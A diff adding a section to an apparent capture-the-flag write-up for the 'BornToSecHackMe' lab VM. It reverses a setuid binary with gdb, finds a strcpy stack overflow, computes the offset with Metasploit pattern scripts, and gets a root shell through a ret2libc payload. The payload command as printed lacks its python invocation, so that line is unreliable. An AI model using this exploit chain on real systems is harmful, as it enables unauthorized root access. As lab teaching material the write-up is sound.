@@ -807,6 +807,164 @@ ssh zaz@192.168.56.8
 zaz@192.168.56.8's password:
 zaz@BornToSecHackMe:~$
 ```
+Success ! Now we are **zaz**.
+
+### Zaz 2 libc
+
+```
+zaz@BornToSecHackMe:~$ ls -lah
+total 12K
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 1 www-data root   80 Oct 13  2015 ..
+-rwsr-s--- 1 root     zaz  4.8K Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+```
+
+We can see a folder named **mail** but more interesting is file called **exploit_me** and it has a setuid bit, which means
+the file is executed as user **root**, if we can exploit it we are **root**.
+
+```
+zaz@BornToSecHackMe:~$ file exploit_me
+exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+./exploit_me
+```
+
+Nothing happens when we execute it, we have to reverse it in order to understand his program.
+
+We can `scp` the file and call gdb against it.
+
+- `scp zaz@192.168.56.8:./exploit_me . `
+- `gdb ./exploit_me`
+
+```
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   ebp
+   0x080483f5 <+1>:	mov    ebp,esp
+   0x080483f7 <+3>:	and    esp,0xfffffff0
+   0x080483fa <+6>:	sub    esp,0x90
+   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    eax,0x1
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048410 <+28>:	add    eax,0x4
+   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
+   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048419 <+37>:	lea    eax,[esp+0x10]
+   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    eax,[esp+0x10]
+   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    eax,0x0
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+```
+
+The program allocates `0x90` byte on the stack, takes an argument, copy this argument to the allocated space and write it
+on stdin. It is vulnerable to buffer overflow !
+
+```
+(gdb) printf "%d\n", 0x90
+144
+(gdb) !python3 -c 'print("a" * 144)'
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+pwndbg> run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+```
+
+Indeed, the program crashes, we have to discover the right offset to overwrite the instruction `eip`.
+
+We can use two scripts for it, located at:
+
+- 'https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb'
+- 'https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb'
+
+The first one creates a pattern we pass at the program and the second one takes the address where the program crashes
+and calculate the offset with it.
+
+```
+wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/tools/exploit/pattern_create.rb \
+&& wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/tools/exploit/pattern_offset.rb \
+&& chmod +x ./pattern_create.rb \
+&& chmod +x ./pattern_offset.rb
+```
+
+Let's create the pattern.
+
+```
+./pattern_create.rb -l 500
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+```
+
+Use it in gdb.
+
+```
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad
+0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4A
+g5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An
+4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+```
+
+Now use the second script to calculate the offset.
+
+```
+./pattern_offset.rb -q '0x37654136'
+[*] Exact match at offset 140
+```
+
+Great, we know our offset. Now we are gonna do a `ret2libc` exploit. We will overwrite the `eip` with the address of the
+function `system` in order to spawn a `/bin/sh`.
+
+1. Get system's function address
+```
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  system
+```
+
+2. Get exit's function address
+```
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xb7e5ebe0  exit
+```
+
+3. Get the address of `/bin/sh` string
+```
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:	 "/bin/sh"
+```
+
+3. Exploit with the payload: `padding + system + exit + /bin/sh`
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $('print("\x90" * 140 +  "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7"  + "\x58\xcc\xf8\xb7")')
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# whoami
+root
+```
+
+We are **root** !
+
+
 
 
 
